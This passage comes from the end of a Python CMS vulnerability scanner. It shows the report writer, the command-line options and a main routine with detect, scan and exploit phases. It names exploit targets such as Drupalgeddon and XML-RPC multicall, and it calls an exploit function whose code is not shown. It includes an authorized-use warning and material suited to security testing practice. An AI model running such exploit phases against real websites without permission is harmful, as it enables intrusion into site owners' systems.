        ("Automatic updates enabled",              "Enable auto-updates in wp-config.php"),
    ]
    for check, fix in checks:
        print(f"  {C.DIM}[ ]{C.RESET} {check}")
        print(f"      {C.DIM}Fix: {fix}{C.RESET}")

# ─── REPORT ───────────────────────────────────────────────────────────────────
def save_report(url, cms_info, vulns, output_dir):
    os.makedirs(output_dir, exist_ok=True)
    ts   = datetime.now().strftime('%Y%m%d_%H%M%S')
    path = os.path.join(output_dir, f"cms_scan_{ts}.txt")

    crits   = sum(1 for t, _ in vulns if t in ['XMLRPC_MULTICALL','WP_VULN_PLUGIN','DRUPALGEDDON2','DRUPALGEDDON'])
    highs   = sum(1 for t, _ in vulns if t in ['WP_USER_ENUM','WP_EXPOSED_FILE','WP_NO_RATE_LIMIT','JOOMLA_EXPOSED','DRUPAL_EXPOSED'])
    mediums = len(vulns) - crits - highs

    with open(path, 'w') as f:
        f.write("="*70 + "\n")
        f.write("  fitijoe WordPress & CMS Deep Scanner Report\n")
        f.write(f"  Target  : {url}\n")
        f.write(f"  CMS     : {cms_info.get('cms','Unknown')}\n")
        f.write(f"  Version : {cms_info.get('version','Unknown')}\n")
        f.write(f"  Date    : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"  Author  : fitijoe (MohamedSuleiman)\n")
        f.write("="*70 + "\n\n")
        f.write(f"VULNERABILITY SUMMARY\n" + "─"*40 + "\n")
        f.write(f"  CRITICAL : {crits}\n")
        f.write(f"  HIGH     : {highs}\n")
        f.write(f"  MEDIUM   : {mediums}\n")
        f.write(f"  TOTAL    : {len(vulns)}\n\n")
        f.write(f"FINDINGS\n" + "─"*40 + "\n")
        for t, d in vulns:
            f.write(f"  [{t}] {d}\n")
        f.write("\n" + "="*70 + "\n")
        f.write("  fitijoe (MohamedSuleiman) — github.com/fitijoe\n")
        f.write("="*70 + "\n")
    return path

# ─── MAIN ─────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description='fitijoe WordPress & CMS Deep Scanner v1.0',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 fitijoe-cms-scanner.py -t http://wordpress-site.com
  python3 fitijoe-cms-scanner.py -t https://target.com --cms wordpress
  python3 fitijoe-cms-scanner.py -t http://target.com --phase detect
  python3 fitijoe-cms-scanner.py -t http://target.com --phase scan

Legal practice targets:
  Set up a local WordPress with XAMPP/Docker for safe practice
        """
    )
    parser.add_argument('-t', '--target',  required=True, help='Target URL (e.g. http://wordpress-site.com)')
    parser.add_argument('--cms', choices=['wordpress','joomla','drupal','auto'], default='auto',
                        help='Force CMS type (default: auto-detect)')
    parser.add_argument('--phase', choices=['detect','scan','exploit','all'], default='all',
                        help='Phase to run (default: all)')
    parser.add_argument('-o', '--output',  default='./cms_reports', help='Output directory')
    args = parser.parse_args()

    banner()

    print(f"{C.YELLOW}{C.BOLD}  ⚠  LEGAL NOTICE{C.RESET}")
    print(f"  {C.DIM}Authorized security testing ONLY.")
    print(f"  Always get written permission before scanning any website.")
    print(f"  fitijoe (MohamedSuleiman) is not responsible for misuse.{C.RESET}\n")

    opt = check_tools()
    url = args.target.rstrip('/')

    print(f"\n  {C.BOLD}Target{C.RESET} : {C.CYAN}{url}{C.RESET}")
    print(f"  {C.BOLD}CMS   {C.RESET} : {C.CYAN}{args.cms}{C.RESET}")
    print(f"  {C.BOLD}Phase {C.RESET} : {C.CYAN}{args.phase}{C.RESET}")
    print(f"  {C.BOLD}Output{C.RESET} : {C.CYAN}{args.output}{C.RESET}\n")

    cms_info = {'cms': args.cms, 'version': None}
    vulns, users, plugins = [], [], []

    if args.phase in ('detect', 'all'):
        cms_info = phase_cms_detect(url, opt)

    cms = args.cms if args.cms != 'auto' else cms_info.get('cms', 'Unknown')

    if args.phase in ('scan', 'all'):
        if cms == 'WordPress':
            vulns, plugins, users = phase_wordpress_scan(url, opt)
        elif cms == 'Joomla':
            vulns = phase_joomla_scan(url)
        elif cms == 'Drupal':
            vulns = phase_drupal_scan(url)
        else:
            warn("CMS not detected — running generic WordPress checks...")
            vulns, plugins, users = phase_wordpress_scan(url, opt)

    if args.phase in ('exploit', 'all'):
        phase_exploit(vulns, url, users, plugins)

    report = save_report(url, cms_info, vulns, args.output)

    section("FINAL SUMMARY")
    ok(f"CMS detected    : {cms_info.get('cms','Unknown')}")
    ok(f"Version         : {cms_info.get('version','Unknown')}")
    ok(f"Plugins found   : {len(plugins)}")
    ok(f"Users found     : {len(users)}")
    vc = len(vulns)
    vc_col = C.RED if vc > 3 else (C.YELLOW if vc > 0 else C.GREEN)
    print(f"  {vc_col}[+]{C.RESET} Vulnerabilities : {C.BOLD}{vc}{C.RESET}")
    ok(f"Report saved    : {C.CYAN}{report}{C.RESET}")
    print(f"\n  {C.DIM}Scan complete — fitijoe (MohamedSuleiman) — {datetime.now().strftime('%H:%M:%S')}{C.RESET}\n")

if __name__ == '__main__':
    main()
